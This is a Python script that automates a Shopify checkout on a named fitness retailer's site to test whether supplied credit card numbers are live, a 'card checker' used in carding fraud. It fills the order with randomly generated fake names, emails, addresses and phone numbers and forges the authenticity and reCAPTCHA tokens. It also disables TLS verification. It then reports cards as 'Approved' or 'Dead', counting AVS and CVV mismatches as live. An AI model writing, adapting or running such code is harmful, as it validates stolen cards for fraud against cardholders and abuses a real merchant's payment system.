import asyncio
from utilsdf.functions import (
    capture,
    random_email,
    random_phone,
    random_street,
    random_word,
)
from string import ascii_letters
from httpx import AsyncClient
from random import choice


async def odali(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        mail = random_email()
        street = random_street()
        phone = random_phone()
        n = random_word(6)

        h = {
            "Host": "www.trxtraining.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        }

        p = "items%5B0%5D%5Bid%5D=40496885596300&items%5B0%5D%5Bquantity%5D=1&items%5B0%5D%5Bselling_plan%5D=962363532"

        r = await session.post(
            "https://www.trxtraining.com/cart/add.js",
            headers=h,
            data=p,
        )

        p2 = "checkout=&updates%5B%5D=1&checkout="

        r2 = await session.post(
            "https://www.trxtraining.com/cart",
            headers=h,
            data=p2,
        )
        at = lambda length: "".join(choice(ascii_letters) for _ in range(length))
        checkout = r2.url

        p3 = f"_method=patch&authenticity_token={at}&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D={mail}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbilling_address%5D%5Bfirst_name%5D={n}&checkout%5Bbilling_address%5D%5Blast_name%5D={n}YT&checkout%5Bbilling_address%5D%5Baddress1%5D={street}&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=New+York&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10027&checkout%5Bbilling_address%5D%5Bphone%5D={phone}&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D={n}&checkout%5Bbilling_address%5D%5Blast_name%5D={n}YT&checkout%5Bbilling_address%5D%5Baddress1%5D={street}&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=New+York&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10027&checkout%5Bbilling_address%5D%5Bphone%5D={phone}&g-recaptcha-response={at}&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300"

        r3 = await session.post(
            checkout,
            headers=h,
            data=p3,
        )

        h4 = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        }

        p4 = {
            "credit_card": {
                "number": f"{cc}",
                "name": f"{n}",
                "month": month,
                "year": year,
                "verification_value": f"{cvv}",
            },
            "payment_session_scope": "www.trxtraining.com",
        }

        r4 = await session.post(
            "https://deposit.us.shopifycs.com/sessions",
            headers=h4,
            json=p4,
        )
        t4 = r4.text
        id_ = capture(t4, '"id":"', '"')

        p5 = f"_method=patch&authenticity_token={at}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=69589926028&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B{phone}&checkout%5Bsubscription_agreement%5D=0&checkout%5Btotal_price%5D=0&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300"

        r5 = await session.post(
            checkout,
            headers=h,
            data=p5,
        )

        p6 = f"_method=patch&authenticity_token={at}&previous_step=payment_method&step=&s=&checkout%5Bpayment_gateway%5D=69589926028&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B{phone}&checkout%5Bsubscription_agreement%5D=0&checkout%5Bsubscription_agreement%5D=1&checkout%5Btotal_price%5D=0&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300"

        r6 = await session.post(
            checkout,
            headers=h,
            data=p6,
        )

        await asyncio.sleep(5)

        r7 = await session.get(
            f"{checkout}?from_processing_page=1&validate=true",
        )
        t7 = r7.text
        msg = capture(t7, '<p class="notice__text">', "</p>")
        url = str(r7.url)

        if "thank_you" in url or "post_purchase" in url:
            status = "Approved! ✅"
            msg = "Subscription Approved!"
        elif "Billing address info was not matched by the processor" in msg:
            status = "Approved! ✅ -» avs"
        elif "Security code was not matched by the processor" in msg:
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
